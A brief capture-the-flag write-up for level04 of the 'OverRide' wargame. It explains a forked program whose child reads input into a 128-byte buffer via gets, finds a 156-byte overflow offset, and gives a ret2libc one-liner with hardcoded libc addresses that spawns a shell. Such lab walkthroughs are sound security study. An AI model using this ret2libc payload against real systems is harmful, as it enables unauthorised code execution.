# level04

## using gdb

follow the child process in gdb:

```
set follow-fork-mode child
```

## the code

The code forks in father and son.
The father track the son process using ptrace. If something get wrong it sends a signal to the son, who
will hang out (instead of terminating or segfaulting).
In the son, a buffer of size 128 seams eager to overflow with the data provided by a gets method.
But...
When we try to overflow, the code hang up the process instead of segfault. Which is not a problem.

## offset

I searched for the offset by dichotomy, and found:

```sh
level04@OverRide:~$ (python -c 'print("A" * 156)') | ./level04
Give me some shellcode, k
Give me some shellcode, k
```

offset is 156

## ret2libc

We reuse the addresses found in level01
(python -c 'print("A" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")'; cat) | ./level04
